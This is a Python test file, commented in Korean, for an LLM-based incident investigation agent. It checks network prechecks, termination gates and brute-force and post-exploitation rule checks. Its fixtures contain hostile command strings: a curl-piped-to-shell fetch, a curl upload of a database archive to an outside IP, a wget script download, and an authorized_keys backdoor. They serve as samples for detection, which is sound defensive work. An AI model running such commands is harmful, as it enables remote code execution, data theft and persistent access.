"""network 사전 조회(loop.py network_precheck)와 웹 요청 집계 검증 (2026-09-24).

- seed에 src_ip가 있으면 첫 LLM 턴 전에 fetch_network_log가 코드로 실행되고,
  그 결과가 첫 턴 관측(pending_observations)으로 LLM에게 전달된다.
- network 조회가 실패해도 "시도"로 인정되어 종료 관문 (c)가 종료를 막지 않는다.
- fetch_web_log summary의 [조회 구간 전체 집계]가 요청 수/상태코드 계열/경로 수를 준다.
"""
from typing import Any, Dict, List

from agent.loop import InvestigationAgent, network_precheck_args
from agent.tools import build_default_registry
from agent.tools.log_source import LOCAL_PATH_ENV
from agent.tools.mock_tools import MOCK_HANDLERS
from agent.tools.real.fetch_web_log import fetch_web_log

SEED = {
    "incident_id": "INC-PRE",
    "trigger_time": "2026-09-24T05:08:15.624203Z",
    "window": ["2026-09-24T05:08:15.624203Z", "2026-09-24T05:13:42.262474Z"],
    "trigger_description": "xmlrpc.php 반복 POST",
    "confidence_initial": 0.6,
    "host": "web-01",
    "src_ip": "129.222.213.124",
}


class RecordingLLM:
    """첫 호출 시점의 state를 기록하고, 정해진 decision을 순서대로 돌려준다."""

    def __init__(self, decisions: List[Dict[str, Any]]) -> None:
        self.decisions = decisions
        self.first_call_tools: List[str] = []
        self.first_call_observations: List[Dict[str, Any]] = []
        self.calls = 0

    def reason(self, state, tool_registry, **_kwargs) -> Dict[str, Any]:
        if self.calls == 0:
            self.first_call_tools = [t.tool_name for t in state.tool_calls]
            self.first_call_observations = list(state.pending_observations)
        decision = self.decisions[min(self.calls, len(self.decisions) - 1)]
        self.calls += 1
        return decision


def _terminate(reason: str, confidence: float = 0.8) -> Dict[str, Any]:
    return {
        "next_action": "terminate",
        "termination_reason": reason,
        "final_verdict": {"verdict": "THREAT_CONFIRMED", "confidence": confidence, "severity": "LOW",
                          "attack_type": "x", "affected_systems": [], "summary": "s", "reasoning": "r"},
    }


def _call(tool: str) -> Dict[str, Any]:
    return {"next_action": "call_tool",
            "tool_call": {"tool_name": tool, "args": {"host": "web-01", "start_time": "a", "end_time": "b"}}}


def test_precheck_args_pad_seed_window():
    assert network_precheck_args(SEED) == {
        "host": "web-01",
        "start_time": "2026-09-24T04:38:15Z",
        "end_time": "2026-09-24T05:43:42Z",
        "ip": "129.222.213.124",
        "limit": 20,
    }
    point = {"host": "h", "src_ip": "1.2.3.4", "trigger_time": "2026-09-24T05:00:00Z"}
    assert network_precheck_args(point)["start_time"] == "2026-09-24T04:30:00Z"
    assert network_precheck_args({**SEED, "src_ip": None}) is None
    assert network_precheck_args({**SEED, "window": None, "trigger_time": "bad"}) is None


def test_precheck_runs_before_first_llm_turn():
    llm = RecordingLLM([_terminate("no_more_evidence")])
    agent = InvestigationAgent(llm, build_default_registry(handlers=MOCK_HANDLERS), network_precheck=True)
    result = agent.run(SEED)
    assert llm.first_call_tools == ["fetch_network_log"]
    assert llm.first_call_observations[0]["args"]["ip"] == "129.222.213.124"
    assert result["tools_called"][0]["tool_name"] == "fetch_network_log"
    assert not any("network 계층 확인 없이" in n for n in result["investigation_notes"])


def test_precheck_off_by_default_and_skipped_without_src_ip():
    llm = RecordingLLM([_terminate("no_more_evidence")])
    InvestigationAgent(llm, build_default_registry(handlers=MOCK_HANDLERS)).run(SEED)
    assert llm.first_call_tools == []

    llm = RecordingLLM([_terminate("no_more_evidence")])
    InvestigationAgent(llm, build_default_registry(handlers=MOCK_HANDLERS), network_precheck=True).run(
        {**SEED, "src_ip": None})
    assert llm.first_call_tools == []


def test_failed_network_call_still_satisfies_gate():
    def broken_network(_args):
        return {"count": 0, "summary": "network 로그 없음", "records": [], "error": "missing_partition"}

    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_network_log": broken_network})
    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), _terminate("confidence_sufficient", 0.9)])
    seed = {**SEED, "confidence_initial": 0.9}
    result = InvestigationAgent(llm, registry, network_precheck=True).run(seed)
    assert result["statistics"]["termination_reason"] == "confidence_sufficient"
    assert not any("종료 관문 발동" in n for n in result["investigation_notes"])


def test_no_more_evidence_with_one_tool_is_rejected_once():
    """도구 1종류로 no_more_evidence 종료를 시도하면 거부되고, 다른 계층을 본 뒤에야 승인."""
    seed = {**SEED, "src_ip": None}
    llm = RecordingLLM([_call("fetch_auth_log"), _terminate("no_more_evidence"),
                        _call("fetch_audit_log"), _terminate("no_more_evidence")])
    result = InvestigationAgent(llm, build_default_registry(handlers=MOCK_HANDLERS),
                                strict_termination=True).run(seed)
    notes = result["investigation_notes"]
    assert sum("도구를 1종류만 직접 확인하고 no_more_evidence" in n for n in notes) == 1
    assert [t["tool_name"] for t in result["tools_called"]] == ["fetch_auth_log", "fetch_audit_log"]
    assert result["statistics"]["termination_reason"] == "no_more_evidence"


def test_precheck_does_not_count_as_llm_chosen_tool():
    """사전 조회(network) + LLM이 고른 도구 1개로는 '서로 다른 도구 2종류'를 채우지 못한다."""
    llm = RecordingLLM([_call("fetch_web_log"), _terminate("confidence_sufficient", 0.95),
                        _call("fetch_audit_log"), _terminate("confidence_sufficient", 0.95)])
    seed = {**SEED, "confidence_initial": 0.95}
    result = InvestigationAgent(llm, build_default_registry(handlers=MOCK_HANDLERS),
                                network_precheck=True, strict_termination=True).run(seed)
    notes = result["investigation_notes"]
    assert sum("서로 다른 도구 1종류만 사용됨" in n for n in notes) == 1
    assert [t["tool_name"] for t in result["tools_called"]] == ["fetch_network_log", "fetch_web_log", "fetch_audit_log"]
    assert result["statistics"]["termination_reason"] == "confidence_sufficient"


def test_different_rejection_reasons_do_not_force_termination():
    """사유가 다른 거부 2회((d) → (b))는 강제 종료로 넘어가지 않고 조사를 계속시킨다."""
    seed = {**SEED, "src_ip": None, "confidence_initial": 0.95}
    llm = RecordingLLM([_call("fetch_auth_log"), _terminate("no_more_evidence"),
                        _terminate("confidence_sufficient", 0.95), _call("fetch_audit_log"),
                        _terminate("confidence_sufficient", 0.95)])
    result = InvestigationAgent(llm, build_default_registry(handlers=MOCK_HANDLERS),
                                strict_termination=True).run(seed)
    notes = result["investigation_notes"]
    assert not any("강제 종료 턴으로 전환" in n for n in notes)
    assert [t["tool_name"] for t in result["tools_called"]] == ["fetch_auth_log", "fetch_audit_log"]
    assert result["statistics"]["termination_reason"] == "confidence_sufficient"


def test_unparseable_llm_response_falls_back_instead_of_crashing():
    """LLM 응답 해석 실패가 두 번 연속 나면 예외로 멈추지 않고 폴백 판정으로 마무리한다."""

    class GeminiDecisionError(Exception):
        pass

    class BrokenLLM:
        calls = 0

        def reason(self, state, tool_registry, **_kwargs):
            BrokenLLM.calls += 1
            raise GeminiDecisionError("Gemini 응답을 JSON으로 파싱하지 못했습니다: Unterminated string")

    result = InvestigationAgent(BrokenLLM(), build_default_registry(handlers=MOCK_HANDLERS),
                                network_precheck=True, strict_termination=True).run(SEED)
    assert BrokenLLM.calls == 2  # 1회 재시도
    assert result["final_verdict"]["verdict"] in ("INCONCLUSIVE", "THREAT_CONFIRMED", "FALSE_POSITIVE")
    assert "자동 폴백 판정" in result["final_verdict"]["reasoning"]
    assert any("LLM 응답 해석 실패" in n for n in result["investigation_notes"])

    class ConfigError(Exception):
        pass

    class BadKeyLLM:
        def reason(self, *_args, **_kwargs):
            raise ConfigError("API key invalid")

    import pytest
    with pytest.raises(ConfigError):  # 설정 오류는 가리지 않고 그대로 올린다
        InvestigationAgent(BadKeyLLM(), build_default_registry(handlers=MOCK_HANDLERS)).run(SEED)


def test_rejection_count_resets_after_new_tool_and_hint_names_tools():
    """거부 → 새 도구 → 거부는 '연속'이 아니다(EC2 xmlrpc 사건). 거부 사유에는 볼 도구를 적어준다."""
    llm = RecordingLLM([_terminate("confidence_sufficient", 0.95), _call("fetch_web_log"),
                        _terminate("confidence_sufficient", 0.95), _call("fetch_audit_log"),
                        _terminate("confidence_sufficient", 0.95)])
    seed = {**SEED, "confidence_initial": 0.95}
    result = InvestigationAgent(llm, build_default_registry(handlers=MOCK_HANDLERS),
                                network_precheck=True, strict_termination=True).run(seed)
    notes = result["investigation_notes"]
    assert not any("강제 종료 턴으로 전환" in n for n in notes)
    assert [t["tool_name"] for t in result["tools_called"]] == ["fetch_network_log", "fetch_web_log", "fetch_audit_log"]
    assert any("fetch_audit_log: 서버에서 실행된 명령" in n for n in notes if "종료 관문" in n)
    assert result["statistics"]["termination_reason"] == "confidence_sufficient"


def test_network_summary_has_aggregate(tmp_path, monkeypatch):
    import json as _json

    from agent.tools.real.fetch_network_log import fetch_network_log

    for key in [*LOCAL_PATH_ENV.values(), "LOG_LOCAL_HOST"]:
        monkeypatch.delenv(key, raising=False)
    rows = [{"timestamp": f"2026-09-24T05:08:{10 + i:02d}.000000+0000", "event_type": "http",
             "src_ip": "129.222.213.124", "dest_ip": "10.0.7.236", "src_port": 40000 + i, "dest_port": 443,
             "proto": "TCP", "http": {"url": "/xmlrpc.php", "http_method": "POST", "status": 503}}
            for i in range(30)]
    rows.append({"timestamp": "2026-09-24T05:09:00.000000+0000", "event_type": "alert",
                 "src_ip": "129.222.213.124", "dest_ip": "10.0.7.236", "src_port": 41000, "dest_port": 443,
                 "proto": "TCP", "alert": {"signature": "ET SCAN xmlrpc flood", "severity": 2}})
    path = tmp_path / "eve.json"
    path.write_text("\n".join(_json.dumps(r) for r in rows) + "\n", encoding="utf-8")
    monkeypatch.setenv("NETWORK_LOG_LOCAL_PATH", str(path))

    result = fetch_network_log({"host": "web-01", "start_time": "2026-09-24T05:00:00Z",
                                "end_time": "2026-09-24T06:00:00Z", "ip": "129.222.213.124", "limit": 20})
    summary = result["summary"]
    assert result["count"] == 20 and result["total_matched"] == 31 and result["has_more"]
    assert "이벤트 31건" in summary
    assert "종류별: http 30건, alert 1건" in summary
    assert "alert signature: ET SCAN xmlrpc flood 1건" in summary
    assert "http 상태코드 계열: 5xx 30건" in summary
    assert "/xmlrpc.php 30건" in summary


def test_no_more_evidence_allowed_when_no_other_tool_registered():
    from agent.tools import ToolRegistry, ToolSpec

    registry = ToolRegistry()
    registry.register(ToolSpec("fetch_web_log", "web", ["host"], ["start_time", "end_time"],
                               handler=lambda a: {"count": 0, "summary": "", "records": []}))
    llm = RecordingLLM([{"next_action": "call_tool",
                         "tool_call": {"tool_name": "fetch_web_log", "args": {"host": "h"}}},
                        _terminate("no_more_evidence")])
    result = InvestigationAgent(llm, registry, strict_termination=True).run({**SEED, "src_ip": None})
    assert not any("종료 관문 발동" in n for n in result["investigation_notes"])


def test_login_success_requires_audit_before_termination():
    """seed src_ip의 로그인 성공이 보이면 audit을 확인하기 전까지 종료를 거부한다."""
    seed = {**SEED, "src_ip": "45.76.13.201", "confidence_initial": 0.9}

    def auth_with_success(_args):
        return {"count": 1, "summary": "성공 1회", "records": [
            {"event": "ssh_accepted", "src_ip": "45.76.13.201", "user": "ubuntu", "pid": 9110,
             "timestamp": "2026-09-14T16:10:07Z", "raw_ref": "auth.log:7"}]}

    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_auth_log": auth_with_success})
    decisions = [_call("fetch_auth_log"), _call("fetch_network_log"), _terminate("confidence_sufficient", 0.95),
                 _call("fetch_audit_log"), _terminate("confidence_sufficient", 0.95)]
    result = InvestigationAgent(RecordingLLM(decisions), registry, strict_termination=True).run(seed)
    notes = result["investigation_notes"]
    assert sum("로그인 후 행위를 audit으로 확인하지 않음" in n and "ppid=9110" in n for n in notes) == 1
    assert [t["tool_name"] for t in result["tools_called"]] == ["fetch_auth_log", "fetch_network_log", "fetch_audit_log"]
    assert result["statistics"]["termination_reason"] == "confidence_sufficient"

    # 다른 IP의 로그인 성공은 조건이 아니다
    decisions = [_call("fetch_auth_log"), _call("fetch_network_log"), _terminate("confidence_sufficient", 0.95)]
    other = InvestigationAgent(RecordingLLM(decisions), registry, strict_termination=True).run(
        {**seed, "src_ip": "198.51.100.1"})
    assert not any("audit으로 확인하지 않음" in n for n in other["investigation_notes"])


def test_report_moves_raw_refs_to_compact_section():
    from agent.report import compact_refs

    few = ["access.log:343", "access.log:344"]
    assert compact_refs(few) == "access.log:343, access.log:344"  # 적으면 원문 그대로
    refs = [f"access.log:{n}" for n in (343, 344, 345, 348, 349, 350, 351, 352, 353)] + ["eve.json:10", "eve.json:12"]
    assert compact_refs(refs) == "access.log:343-345, 348-353 / eve.json:10, 12"
    many = [f"eve.json:{n}" for n in range(0, 40, 2)]  # 비연속 20줄
    assert compact_refs(many) == "eve.json:0, 2, 4, 6, 8, 10 외 14줄"


def test_audit_event_type_accepts_record_type_and_zero_hint():
    """event_type에 룰 key 대신 레코드 종류(EXECVE)를 넣어도 매칭하고, 필터로 0건이면 안내를 준다."""
    from agent.tools.log_source import filtered_out_hint
    from agent.tools.real.fetch_audit_log import _event_type_matches

    record = {"key": "exec", "syscall": "execve", "record_types": ["SYSCALL", "EXECVE", "PATH"]}
    assert all(_event_type_matches(record, v) for v in ("exec", "EXECVE", "execve", "Syscall"))
    assert not _event_type_matches(record, "identity")

    assert "필터 없이 보면 이벤트가 4건" in filtered_out_hint(4, {"event_type": "x", "ppid": None}, ("event_type", "ppid"))
    assert "로그 기록 자체가 없습니다" in filtered_out_hint(0, {"event_type": "x"}, ("event_type",))
    assert filtered_out_hint(4, {}, ("event_type",)) == ""


def test_web_summary_has_request_aggregate(tmp_path, monkeypatch):
    for key in [*LOCAL_PATH_ENV.values(), "LOG_LOCAL_HOST"]:
        monkeypatch.delenv(key, raising=False)
    lines = []
    for i in range(12):
        lines.append(
            f'2026-09-24T05:08:{10 + i:02d}.000000Z r{i} 129.222.213.124 127.0.0.1 https example.com '
            f'"POST /xmlrpc.php HTTP/1.1" 503 100 1000 200 "-" "Jetpack by WordPress.com" xff="-"'
        )
    lines.append(
        '2026-09-24T05:09:00.000000Z r99 129.222.213.124 127.0.0.1 https example.com '
        '"GET /wp-login.php HTTP/1.1" 404 100 1000 200 "-" "curl/7.0" xff="-"'
    )
    path = tmp_path / "access.log"
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    monkeypatch.setenv("WEB_LOG_LOCAL_PATH", str(path))

    result = fetch_web_log({"host": "web-01", "start_time": "2026-09-24T05:00:00Z",
                            "end_time": "2026-09-24T06:00:00Z", "src_ip": "129.222.213.124"})
    summary = result["summary"]
    assert result["total_matched"] == 13
    assert "요청 13건" in summary
    assert "메서드별: POST 12건, GET 1건" in summary
    assert "상태코드 계열별: 5xx 12건, 4xx 1건" in summary
    assert "서로 다른 경로 2개" in summary
    assert "/xmlrpc.php 12건" in summary
    assert "인증·원격호출 엔드포인트 POST 12회 → 인증 대입 기준(POST 10회 이상) 충족" in summary
    assert "경로 스캔 기준(경로 20개 이상이고 4xx 과반) 미충족" in summary


def test_false_positive_rejected_when_principle9_met():
    """원칙 9 인증 대입 기준 충족인데 FALSE_POSITIVE로 끝내려 하면 한 번 거부하고 다시 판정시킨다."""
    def web_with_rule(_args):
        return {"count": 1, "summary": "POST 81건", "records": [],
                "rule_checks": [{"rule": "principle_9", "src_ip": "129.222.213.124", "auth_posts": 81,
                                 "auth_bruteforce": True, "distinct_paths": 1, "four_xx": 0, "path_scan": False}]}

    def fp(conf=0.85):
        d = _terminate("confidence_sufficient", conf)
        d["final_verdict"] = {**d["final_verdict"], "verdict": "FALSE_POSITIVE"}
        return d

    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_web_log": web_with_rule})
    seed = {**SEED, "confidence_initial": 0.9}
    llm = RecordingLLM([_call("fetch_web_log"), _call("fetch_audit_log"), fp(), _terminate("confidence_sufficient", 0.9)])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(seed)
    assert result["final_verdict"]["verdict"] == "THREAT_CONFIRMED"
    assert sum("원칙 9 기준 충족" in n for n in result["investigation_notes"]) == 1

    # 끝까지 FALSE_POSITIVE면 판정은 그대로 두고 불일치 경고를 남긴다
    llm = RecordingLLM([_call("fetch_web_log"), _call("fetch_audit_log"), fp()])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(seed)
    assert result["final_verdict"]["verdict"] == "FALSE_POSITIVE"
    assert any(n.startswith("⚠ 판정-원칙 불일치") for n in result["investigation_notes"])


def test_audit_rule_check_counts_whole_result_not_page():
    """웹 서버 계정의 의심 명령은 페이지(limit)와 무관하게 전체 기준으로 센다."""
    from agent.tools.real.fetch_audit_log import audit_rule_check, _audit_stats

    noise = [{"user": "root", "comm": "systemctl", "exec_args": "systemctl status cron", "raw_ref": f"a:{i}",
              "timestamp": "2026-09-22T13:45:51Z"} for i in range(300)]
    shell = [{"user": "www-data", "comm": "sh", "exec_args": "sh -c curl -s http://203.0.113.50/x.sh | sh",
              "raw_ref": "a:999", "timestamp": "2026-09-22T13:45:52Z"}]
    check = audit_rule_check(noise + shell)
    assert check["web_server_exec"] == 1 and check["web_server_suspicious"] == 1
    assert "www-data: sh -c curl" in check["examples"][0]
    text = _audit_stats(noise + shell, check)
    assert "웹 서버 계정(www-data/apache/nginx/http) 실행 1건 중 셸·의심 명령 1건" in text
    assert audit_rule_check(noise)["web_server_suspicious"] == 0


def test_audit_rule_check_ignores_routine_system_commands():
    """EC2 실측: cron의 sh -c와 EC2 Instance Connect가 '의심 명령' 245건으로 잡혔다. 둘 다 제외한다."""
    from agent.tools.real.fetch_audit_log import audit_rule_check

    routine = [
        {"user": "root", "comm": "sh", "exec_args": "/bin/sh -c command -v debian-sa1 > /dev/null && debian-sa1 1 1"},
        {"user": "root", "comm": "sshd", "exec_args": "/usr/sbin/sshd -D -o AuthorizedKeysCommand "
                                                      "/usr/share/ec2-instance-connect/eic_run_authorized_keys %u %f"},
    ]
    check = audit_rule_check(routine)
    assert check["suspicious"] == 0 and check["web_server_suspicious"] == 0
    # 웹 서버 계정이 셸을 띄우면 명령 내용과 무관하게 의심으로 센다
    assert audit_rule_check([{"user": "www-data", "comm": "sh", "exec_args": "sh -c id"}])["web_server_suspicious"] == 1
    # 백도어 키 추가는 여전히 잡는다
    assert audit_rule_check([{"user": "root", "comm": "bash",
                              "exec_args": "bash -c echo ssh-rsa AAA >> /root/.ssh/authorized_keys"}])["suspicious"] == 1


def test_ip_filter_zero_hint_says_no_activity():
    from agent.tools.log_source import filtered_out_hint

    hint = filtered_out_hint(7, {"ip": "92.118.39.50"}, ("ip", "event_type"))
    assert "해당 IP의 활동 없음" in hint and "필터를 빼거나" not in hint
    assert "필터를 빼거나" in filtered_out_hint(7, {"ip": "1.2.3.4", "event_type": "alert"}, ("ip", "event_type"))


def _ssh_failures(ip: str, count: int, users=("root",)):
    return [{"event": "ssh_failed", "src_ip": ip, "user": users[i % len(users)], "raw_ref": f"auth.log:{i}"}
            for i in range(count)]


def test_principle7_check():
    from agent.tools.real.fetch_auth_log import principle7_check, _principle7_text

    sporadic = principle7_check(_ssh_failures("92.118.39.50", 2))
    assert sporadic["sporadic"] and not sporadic["bruteforce"]
    assert "미충족(단발성 실패)" in _principle7_text(sporadic)
    assert principle7_check(_ssh_failures("92.118.39.50", 5))["bruteforce"]
    assert principle7_check(_ssh_failures("92.118.39.50", 2, users=("root", "admin")))["bruteforce"]
    # 성공이 있거나 IP가 섞이면 코드 기준을 내지 않는다(Q2/Q3 판단 필요)
    assert principle7_check(_ssh_failures("92.118.39.50", 6) + [{"event": "ssh_accepted", "src_ip": "92.118.39.50"}]) is None
    assert principle7_check(_ssh_failures("1.1.1.1", 3) + _ssh_failures("2.2.2.2", 3)) is None

    # EC2 2026-09-25: 로그인 시도 없이 접속만(ssh_probe 2건) → 단발성 이하로 판정 기준을 준다
    probe = [{"event": "ssh_probe", "src_ip": "45.239.159.94", "raw_ref": f"auth.log:{i}"} for i in range(2)]
    check = principle7_check(probe)
    assert check["sporadic"] and check["failures"] == 0 and check["probes"] == 2
    assert "로그인 시도 없이 접속만 2건" in _principle7_text(check)
    # 탐침이 많거나 키 전용 서버의 인증 시도(ssh_auth_fail_close)가 있으면 LLM 판단에 맡긴다
    assert principle7_check(probe * 3) is None
    assert principle7_check(probe + [{"event": "ssh_auth_fail_close", "src_ip": "45.239.159.94",
                                      "user": "root"}]) is None


def test_gate_applies_principle7_both_ways():
    """EC2 2026-09-25: root 실패 2회·성공 0회를 THREAT_CONFIRMED로 판정 → 원칙 7(단발성)과 충돌이면 거부."""
    def auth_with(check):
        return lambda _args: {"count": 2, "summary": "auth", "records": [], "window_total": 7, "rule_checks": [check]}

    sporadic = {"rule": "principle_7", "src_ip": SEED["src_ip"], "failures": 2, "accounts": 1, "successes": 0,
                "bruteforce": False, "sporadic": True}
    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_auth_log": auth_with(sporadic)})
    fp = _terminate("confidence_sufficient", 0.85)
    fp["final_verdict"] = {**fp["final_verdict"], "verdict": "FALSE_POSITIVE"}
    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"),
                        _terminate("confidence_sufficient", 0.9), fp])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(
        {**SEED, "confidence_initial": 0.9})
    assert result["final_verdict"]["verdict"] == "FALSE_POSITIVE"
    assert any("원칙 7 기준 미충족" in n for n in result["investigation_notes"])

    # INCONCLUSIVE도 거부 (EC2 2026-09-25 탐침 사건: 필요한 사실은 모두 확인됨)
    inc = _terminate("no_more_evidence")
    inc["final_verdict"] = {**inc["final_verdict"], "verdict": "INCONCLUSIVE"}
    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), inc, fp])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(
        {**SEED, "confidence_initial": 0.9})
    assert result["final_verdict"]["verdict"] == "FALSE_POSITIVE"

    brute = {**sporadic, "failures": 9, "bruteforce": True, "sporadic": False}
    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_auth_log": auth_with(brute)})
    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), fp,
                        _terminate("confidence_sufficient", 0.9)])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(
        {**SEED, "confidence_initial": 0.9})
    assert result["final_verdict"]["verdict"] == "THREAT_CONFIRMED"
    assert any("원칙 7 기준 충족" in n for n in result["investigation_notes"])


def test_gate_rejects_verdicts_contradicting_tool_facts():
    """로그 미확보면 INCONCLUSIVE만, 웹 서버 계정 의심 명령이 있으면 TC·HIGH 이상만 승인."""
    def empty(_args):
        return {"count": 0, "summary": "0건", "records": [], "window_total": 0}

    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_web_log": empty, "fetch_auth_log": empty,
                                                "fetch_network_log": empty, "fetch_audit_log": empty})
    fp = _terminate("no_more_evidence")
    fp["final_verdict"] = {**fp["final_verdict"], "verdict": "FALSE_POSITIVE"}
    inc = _terminate("no_more_evidence")
    inc["final_verdict"] = {**inc["final_verdict"], "verdict": "INCONCLUSIVE"}
    llm = RecordingLLM([_call("fetch_web_log"), _call("fetch_auth_log"), fp, inc])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(SEED)
    assert result["final_verdict"]["verdict"] == "INCONCLUSIVE"
    assert any("로그 미확보" in n for n in result["investigation_notes"] if "종료 관문" in n)

    def audit_with_shell(_args):
        return {"count": 1, "summary": "audit", "records": [], "window_total": 300, "rule_checks": [{
            "rule": "audit_post_exploitation", "web_server_exec": 1, "web_server_suspicious": 1, "suspicious": 1,
            "examples": ["www-data: sh -c curl ... (audit.log:9)"]}]}

    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_audit_log": audit_with_shell})
    medium = _terminate("confidence_sufficient", 0.95)
    medium["final_verdict"] = {**medium["final_verdict"], "severity": "MEDIUM"}
    high = _terminate("confidence_sufficient", 0.95)
    high["final_verdict"] = {**high["final_verdict"], "severity": "HIGH"}
    llm = RecordingLLM([_call("fetch_web_log"), _call("fetch_audit_log"), medium, high])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(
        {**SEED, "confidence_initial": 0.95})
    assert result["final_verdict"]["severity"] == "HIGH"
    assert any("웹 서버 계정의 의심 명령 실행 1건" in n for n in result["investigation_notes"])


def test_bruteforce_without_login_success_cannot_be_high_severity():
    """EC2 2026-09-26: 31개 계정·76회 실패, 성공 0회를 HIGH로 판정 → 원칙 7(LOW~MEDIUM)과 충돌하면 거부."""
    brute = {"rule": "principle_7", "src_ip": SEED["src_ip"], "failures": 76, "accounts": 31, "successes": 0,
             "probes": 0, "bruteforce": True, "sporadic": False}
    auth = lambda _args: {"count": 76, "summary": "auth", "records": [], "window_total": 90, "rule_checks": [brute]}
    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_auth_log": auth})
    high = _terminate("confidence_sufficient", 0.9)
    high["final_verdict"] = {**high["final_verdict"], "severity": "HIGH"}
    medium = _terminate("confidence_sufficient", 0.9)
    medium["final_verdict"] = {**medium["final_verdict"], "severity": "MEDIUM"}
    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), high, medium])
    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(
        {**SEED, "confidence_initial": 0.9})
    assert result["final_verdict"]["severity"] == "MEDIUM"
    assert any("severity를 HIGH로" in n for n in result["investigation_notes"])


def _fp(reason="confidence_sufficient", conf=0.8):
    d = _terminate(reason, conf)
    d["final_verdict"] = {**d["final_verdict"], "verdict": "FALSE_POSITIVE"}
    return d


def _auth_probe_registry():
    probe = {"rule": "principle_7", "src_ip": SEED["src_ip"], "failures": 0, "accounts": 0, "successes": 0,
             "probes": 2, "bruteforce": False, "sporadic": True}
    auth = lambda _args: {"count": 2, "summary": "auth", "records": [], "window_total": 9, "rule_checks": [probe]}
    return build_default_registry(handlers={**MOCK_HANDLERS, "fetch_auth_log": auth})


def test_rule_matching_verdict_is_not_rejected_for_low_confidence():
    """EC2 2026-09-25 탐침 사건: FALSE_POSITIVE가 신뢰도 0.80으로 5회 거부됐다. 판정이 원칙 7 기준과 같으면 승인."""
    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), _fp()])
    result = InvestigationAgent(llm, _auth_probe_registry(), network_precheck=True, strict_termination=True).run(SEED)
    assert result["final_verdict"]["verdict"] == "FALSE_POSITIVE"
    assert not any("종료 관문" in n for n in result["investigation_notes"])
    # 기준과 다른 판정(THREAT_CONFIRMED)은 여전히 신뢰도 미달로도 거부된다
    llm = RecordingLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), _terminate("confidence_sufficient"), _fp()])
    result = InvestigationAgent(llm, _auth_probe_registry(), network_precheck=True, strict_termination=True).run(SEED)
    assert any("신뢰도" in n and "원칙 7" in n for n in result["investigation_notes"] if "종료 관문" in n)


def test_forced_turn_cannot_flip_rule_consistent_verdict():
    """강제 종료 턴에서 LLM이 원칙과 어긋나게 판정을 뒤집으면 앞서 낸 원칙에 맞는 판정을 쓴다."""
    tc = _terminate("confidence_sufficient", 0.85)
    # auth 하나만 보고 FALSE_POSITIVE로 두 번 종료 요청 → (b) 도구 1종류로 연속 거부 → 강제 종료 턴에서 TC
    llm = RecordingLLM([_call("fetch_auth_log"), _fp(), _fp(), tc])
    result = InvestigationAgent(llm, _auth_probe_registry(), network_precheck=True, strict_termination=True).run(SEED)
    assert result["final_verdict"]["verdict"] == "FALSE_POSITIVE"
    assert any("강제 종료 턴 판정(THREAT_CONFIRMED)" in n for n in result["investigation_notes"])


def test_user_prompt_keeps_previous_tool_summaries():
    """이전 도구 결과 요약은 한 턴 뒤에도 already_called_tools에 남는다 (원문 records는 한 턴만)."""
    import json as _json
    from agent.prompts import build_user_prompt

    seen_prompts = []

    class PromptLLM(RecordingLLM):
        def reason(self, state, tool_registry, **kwargs):
            seen_prompts.append(build_user_prompt(state, **kwargs))
            return super().reason(state, tool_registry, **kwargs)

    auth = lambda _args: {"count": 2, "summary": "auth 요약 [원칙 7 기준] 미충족", "records": [], "window_total": 7}
    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_auth_log": auth})
    llm = PromptLLM([_call("fetch_auth_log"), _call("fetch_audit_log"), _terminate("no_more_evidence")])
    InvestigationAgent(llm, registry, network_precheck=True).run(SEED)

    last = _json.loads(seen_prompts[-1].split("\n\n", 1)[1][seen_prompts[-1].split("\n\n", 1)[1].index("{"):])
    history = last["already_called_tools"]
    assert [h["tool_name"] for h in history] == ["fetch_network_log", "fetch_auth_log", "fetch_audit_log"]
    assert history[0].get("system_precheck") is True and "system_precheck" not in history[1]
    assert history[1]["summary"] == "auth 요약 [원칙 7 기준] 미충족" and history[1]["result_count"] == 2
    # 원문 관측은 직전 도구(audit) 것만
    assert [o["tool_name"] for o in last["raw_observations_since_last_turn"]] == ["fetch_audit_log"]


def test_confidence_sum_has_no_float_drift():
    from agent.models import AgentState

    state = AgentState(incident_id="X", seed={})
    state.current_confidence = 0.6
    state.update_confidence(0.25, "s", "r")
    assert state.current_confidence == 0.85 and not state.current_confidence < 0.85


def test_command_external_ips_keep_only_public_addresses():
    from agent.tools.real.fetch_audit_log import command_external_ips
    records = [
        {"user": "ubuntu", "exec_args": "curl -T /tmp/db.tar.gz http://185.220.101.47/upload"},
        {"user": "ubuntu", "exec_args": "wget http://185.220.101.47/a.sh -O /tmp/a.sh"},
        {"user": "ubuntu", "exec_args": "ssh 10.0.7.12 && ping 127.0.0.1 && curl 169.254.169.254/latest"},
        {"user": "root", "exec_args": "sshd -o AuthorizedKeysCommand 3.3.3.3"},  # EC2 Instance Connect 제외
        {"user": "ubuntu", "exec_args": "echo 1.2.3.4.5 999.1.1.1"},  # IP가 아닌 숫자열
    ]
    assert command_external_ips(records) == ["185.220.101.47"]


def test_command_external_ip_must_be_checked_on_network_before_termination():
